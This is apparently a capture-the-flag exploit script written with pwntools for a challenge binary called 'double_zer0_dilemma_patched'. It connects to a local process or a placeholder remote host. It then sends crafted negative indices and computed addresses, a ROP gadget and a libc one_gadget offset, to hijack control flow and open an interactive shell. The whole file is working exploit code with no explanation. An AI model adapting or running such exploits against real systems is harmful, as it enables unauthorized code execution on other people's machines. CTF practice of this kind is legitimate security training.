#!/usr/bin/env python3

from pwn import *

exe = ELF("double_zer0_dilemma_patched")
libc = ELF("libc.so.6")
ld = ELF("ld.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a,b : r.sendline(a,b)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

def main():
    pop_r12 = 0x000000000808a3bc
    gdb.attach(r)
    sla(':', f'{-0x16}')
    sla(':', f'{(pop_r12*2)-0x401060}')

    #gdb.attach(r)
    rand_offset = 0x475C0
    one_gadget = 0xe3b04
    sla(':', f'{-0x17}')
    sla(':', f'{one_gadget-rand_offset}')
    r.interactive()



if __name__ == "__main__":
    main()
